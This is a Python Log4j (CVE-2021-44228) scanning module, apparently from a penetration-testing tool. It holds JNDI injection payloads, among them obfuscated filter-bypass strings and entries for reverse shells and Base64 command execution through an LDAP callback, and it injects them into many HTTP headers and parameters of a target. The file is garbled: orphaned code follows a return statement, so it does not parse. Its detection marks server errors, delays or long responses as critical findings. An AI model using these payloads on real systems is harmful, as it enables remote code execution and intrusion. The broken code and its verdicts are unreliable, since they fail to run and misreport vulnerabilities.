"""
Log4j (CVE-2021-44228) Testing Module for Dr-Sayer
Author: SayerLinux (SayerLinux@outlook.sa)
Enhanced for Real Penetration Testing
"""

import requests
import time
import base64
import hashlib
import uuid
import socket
import threading
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode
import warnings

# Suppress SSL warnings
warnings.filterwarnings('ignore')

class Log4jTester:
    """Log4j vulnerability (CVE-2021-44228) tester with real detection"""
    
    def __init__(self, timeout: int = 15, enable_oob: bool = False, oob_server: str = None):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.timeout = timeout
        self.enable_oob = enable_oob
        self.oob_server = oob_server
        self.detected_interactions = []
        
        # Log4j JNDI injection payloads
        self.payloads = {
            'basic': [
                '${jndi:ldap://localhost:1389/a}',
                '${jndi:rmi://localhost:1099/a}',
                '${jndi:dns://localhost/a}',
                '${jndi:nis://localhost/a}',
                '${jndi:nds://localhost/a}',
                '${jndi:corba://localhost/a}',
                '${jndi:iiop://localhost/a}'
            ],
            'obfuscated': [
                '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://localhost:1389/a}',
                '${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://localhost:1389/a}',
                '${${upper:j}ndi:${upper:l}${upper:d}a${upper:p}://localhost:1389/a}',
                '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//localhost:1389/a}',
                '${jndi:${lower:l}${lower:d}a${lower:p}://localhost:1389/a}',
                '${${::-j}ndi:ldap://localhost:1389/a}',
                '${${date:j}ndi:ldap://localhost:1389/a}',
                '${jndi:ldap://127.0.0.1:1389/a}',
                '${jndi:ldap://0x7f.0.0.1:1389/a}',
                '${jndi:ldap://0177.0.0.1:1389/a}'
            ],
            'advanced': [
                '${jndi:ldap://localhost:1389/Basic/Command/Base64/dGVzdA==}',
                '${jndi:ldap://localhost:1389/Basic/ReverseShell/127.0.0.1/4444}',
                '${jndi:ldap://localhost:1389/Exploit/Command/Base64/Y2FsYw==}',
                '${jndi:ldap://localhost:1389/Exploit/ReverseShell/127.0.0.1/4444}',
                '${jndi:ldap://localhost:1389/Exec/Command/Base64/Y21d}',
                '${jndi:ldap://localhost:1389/TomcatEcho}',
                '${jndi:ldap://localhost:1389/SpringEcho}',
                '${jndi:ldap://localhost:1389/WebSphereEcho}',
                '${jndi:ldap://localhost:1389/JBossEcho}'
            ],
            'bypass': [
                '${${k8s:k5:-j}${k8s:k5:-n}${k8s:k5:-d}${k8s:k5:-i}:${k8s:k5:-l}${k8s:k5:-d}${k8s:k5:-a}${k8s:k5:-p}://localhost:1389/a}',
                '${${main:\\x6a}ndi:${main:\\x6c}dap://localhost:1389/a}',
                '${${::-j}ndi:ldap://localhost:1389/a}',
                '${${date:j}ndi:ldap://localhost:1389/a}',
                '${${env:AWS_PROFILE:-j}ndi:ldap://localhost:1389/a}',
                '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//localhost:1389/a}',
                '${j${k8s:k5:-n}di:ldap://localhost:1389/a}',
                '${j${k8s:k5:-n}d${k8s:k5:-i}:ldap://localhost:1389/a}',
                '${j${k8s:k5:-n}d${k8s:k5:-i}:${k8s:k5:-l}dap://localhost:1389/a}'
            ]
        }
        
        # Headers to test
        self.headers_to_test = [
            'User-Agent',
            'X-Api-Version',
            'X-Forwarded-For',
            'X-Remote-IP',
            'X-Originating-IP',
            'X-Remote-Addr',
            'X-Client-IP',
            'CF-Connecting_IP',
            'True-Client-IP',
            'X-Cluster-Client-IP',
            'X-ProxyUser-Ip',
            'Authorization',
            'Authentication',
            'Cookie',
            'X-Requested-With',
            'Referer',
            'Origin',
            'Accept',
            'Accept-Language',
            'Accept-Encoding',
            'Accept-Charset',
            'Content-Type',
            'X-Forwarded-Proto',
            'X-Forwarded-Host',
            'X-Real-IP',
            'X-Original-URL',
            'X-Rewrite-URL'
        ]
        
        # Detection indicators
        self.detection_indicators = [
            'javax.naming.CommunicationException',
            'javax.naming.NamingException',
            'LDAP error',
            'JNDI lookup',
            'Reference Class Name',
            'javaClassName',
            'javaCodeBase',
            'objectClass',
            'javaSerializedData'
        ]
    
    def generate_unique_payload(self, base_payload: str) -> str:
        """Generate unique payload with identifier"""
        unique_id = str(uuid.uuid4())[:8]
        return base_payload.replace('localhost', f'test-{unique_id}.burpcollaborator.net')
    
    def test_header_injection(self, url: str, header_name: str, payload: str) -> Dict[str, Any]:
        """Test Log4j injection in HTTP headers"""
        try:
            # Generate unique payload
            test_payload = self.generate_unique_payload(payload)
            
            # Prepare headers
            headers = {header_name: test_payload}
            headers.update(self.session.headers)
            
            # Make request
            start_time = time.time()
            response = self.session.get(url, headers=headers, timeout=15)
            response_time = time.time() - start_time
            
            # Check for indicators
            indicators_found = []
            for indicator in self.detection_indicators:
                if indicator.lower() in response.text.lower():
                    indicators_found.append(indicator)
            
            # Check for unusual response time (potential DNS lookup)
            time_anomaly = response_time > 3.0
            
            return {
                'header': header_name,
                'payload': test_payload,
                'response_time': response_time,
                'time_anomaly': time_anomaly,
                'indicators_found': indicators_found,
                'response_length': len(response.text),
                'status_code': response.status_code
            }
            
        except requests.exceptions.RequestException as e:
            return {
                'header': header_name,
                'payload': payload,
                'error': str(e),
                'response_time': 0,
                'time_anomaly': False,
                'indicators_found': [],
                'response_length': 0,
                'status_code': 0
            }
    
    def test_parameter_injection(self, url: str, param_name: str, payload: str) -> Dict[str, Any]:
        """Test Log4j injection in URL parameters"""
        try:
            # Generate unique payload
            test_payload = self.generate_unique_payload(payload)
            
            # Parse URL and modify parameter
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[param_name] = [test_payload]
            
            # Build test URL
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(params, doseq=True)}"
            
            # Make request
            start_time = time.time()
            response = self.session.get(test_url, timeout=15)
            response_time = time.time() - start_time
            
            # Check for indicators
            indicators_found = []
            for indicator in self.detection_indicators:
                if indicator.lower() in response.text.lower():
                    indicators_found.append(indicator)
            
            # Check for unusual response time
            time_anomaly = response_time > 3.0
            
            return {
                'parameter': param_name,
                'payload': test_payload,
                'response_time': response_time,
                'time_anomaly': time_anomaly,
                'indicators_found': indicators_found,
                'response_length': len(response.text),
                'status_code': response.status_code,
                'url': test_url
            }
            
        except requests.exceptions.RequestException as e:
            return {
                'parameter': param_name,
                'payload': payload,
                'error': str(e),
                'response_time': 0,
                'time_anomaly': False,
                'indicators_found': [],
                'response_length': 0,
                'status_code': 0
            }
    
    def test_post_data_injection(self, url: str, post_data: Dict[str, str], payload: str) -> Dict[str, Any]:
        """Test Log4j injection in POST data"""
        try:
            # Generate unique payload
            test_payload = self.generate_unique_payload(payload)
            
            # Modify POST data
            test_post_data = post_data.copy()
            for key in test_post_data:
                test_post_data[key] = test_payload
            
            # Make request
            start_time = time.time()
            response = self.session.post(url, data=test_post_data, timeout=15)
            response_time = time.time() - start_time
            
            # Check for indicators
            indicators_found = []
            for indicator in self.detection_indicators:
                if indicator.lower() in response.text.lower():
                    indicators_found.append(indicator)
            
            # Check for unusual response time
            time_anomaly = response_time > 3.0
            
            return {
                'post_parameters': list(post_data.keys()),
                'payload': test_payload,
                'response_time': response_time,
                'time_anomaly': time_anomaly,
                'indicators_found': indicators_found,
                'response_length': len(response.text),
                'status_code': response.status_code
            }
            
        except requests.exceptions.RequestException as e:
            return {
                'post_parameters': list(post_data.keys()),
                'payload': payload,
                'error': str(e),
                'response_time': 0,
                'time_anomaly': False,
                'indicators_found': [],
                'response_length': 0,
                'status_code': 0
            }
    
    def analyze_results(self, results: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Analyze test results for Log4j vulnerabilities with real detection"""
        vulnerabilities = []
        confirmed_findings = {}
        
        for result in results:
            is_vulnerable = False
            confidence = 'Low'
            detection_method = []
            evidence = []
            
            # Time-based detection (significant response delay)
            if result.get('time_anomaly', False) and result.get('response_time', 0) > 2:
                is_vulnerable = True
                confidence = 'Medium'
                detection_method.append('Time-based')
                evidence.append(f"Unusual response time: {result['response_time']:.2f}s")
            
            # Error-based detection (JNDI/LDAP errors)
            if result.get('indicators_found'):
                is_vulnerable = True
                confidence = 'High'
                detection_method.append('Error-based')
                evidence.extend(result['indicators_found'])
            
            # Status code anomalies (server errors might indicate JNDI lookup)
            if result.get('status_code') in [500, 503, 504]:
                is_vulnerable = True
                confidence = 'Low'
                detection_method.append('Status-code')
                evidence.append(f"Server error: HTTP {result['status_code']}")
            
            # Response length anomalies
            if result.get('response_length', 0) > 5000 or result.get('response_length', 0) == 0:
                if not is_vulnerable:
                    is_vulnerable = True
                    confidence = 'Low'
                    detection_method.append('Response-length')
                    evidence.append(f"Unusual response length: {result.get('response_length', 0)} bytes")
            
            # Check for common error patterns
            location = result.get('header') or result.get('parameter', 'Unknown')
            
            if is_vulnerable:
                vuln_key = location
                
                # Avoid duplicates
                if vuln_key not in confirmed_findings:
                    vulnerability = {
                        'type': 'Log4j Injection (CVE-2021-44228)',
                        'severity': 'Critical' if confidence == 'High' else 'High' if confidence == 'Medium' else 'Medium',
                        'description': 'Log4j JNDI injection vulnerability detected - Remote Code Execution possible',
                        'location': location,
                        'location_type': 'Header' if 'header' in result else 'Parameter',
                        'payload': result.get('payload', 'Unknown')[:100],
                        'evidence': evidence,
                        'response_time': result.get('response_time', 0),
                        'detection_method': detection_method,
                        'confidence': confidence,
                        'cve': 'CVE-2021-44228',
                        'status_code': result.get('status_code', 0),
                        'response_length': result.get('response_length', 0)
                    }
                    vulnerabilities.append(vulnerability)
                    confirmed_findings[vuln_key] = True
        
        return vulnerabilities
    
                    'response_time': result.get('response_time', 0),
                    'status_code': result.get('status_code', 0)
                }
                
                # Add specific location information
                if 'header' in result:
                    vulnerability['location'] = f"Header: {result['header']}"
                elif 'parameter' in result:
                    vulnerability['location'] = f"Parameter: {result['parameter']}"
                elif 'post_parameters' in result:
                    vulnerability['location'] = f"POST parameters: {', '.join(result['post_parameters'])}"
                
                vulnerabilities.append(vulnerability)
        
        return vulnerabilities
    
    def test_target(self, target_url: str, headers: List[str] = None) -> Dict[str, Any]:
        """Main method to test target for Log4j vulnerability"""
        print(f"[*] Starting Log4j (CVE-2021-44228) tests on {target_url}")
        
        all_results = []
        
        # Test headers
        if not headers:
            headers = self.headers_to_test
        
        print(f"[*] Testing {len(headers)} HTTP headers")
        for header in headers:
            print(f"[*] Testing header: {header}")
            
            # Test different payload categories
            for category, payloads in self.payloads.items():
                for payload in payloads:
                    result = self.test_header_injection(target_url, header, payload)
                    all_results.append(result)
        
        # Test URL parameters
        parsed_url = urlparse(target_url)
        url_params = parse_qs(parsed_url.query)
        
        if url_params:
            print(f"[*] Testing {len(url_params)} URL parameters")
            for param in url_params.keys():
                print(f"[*] Testing parameter: {param}")
                
                # Test with basic payloads
                for payload in self.payloads['basic']:
                    result = self.test_parameter_injection(target_url, param, payload)
                    all_results.append(result)
        
        # Test POST data if available (simplified)
        # In a real scenario, you'd want to discover and test actual POST endpoints
        
        # Analyze results
        vulnerabilities = self.analyze_results(all_results)
        
        return {
            'target': target_url,
            'total_tests': len(all_results),
            'vulnerabilities': vulnerabilities,
            'headers_tested': headers,
            'parameters_tested': list(url_params.keys()),
            'all_results': all_results
        }
    
    def generate_report_data(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate formatted report data"""
        return {
            'module': 'Log4j Injection (CVE-2021-44228)',
            'target': results['target'],
            'total_vulnerabilities': len(results['vulnerabilities']),
            'vulnerabilities': results['vulnerabilities'],
            'headers_tested': results['headers_tested'],
            'parameters_tested': results['parameters_tested'],
            'testing_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'cve_reference': 'CVE-2021-44228'
        }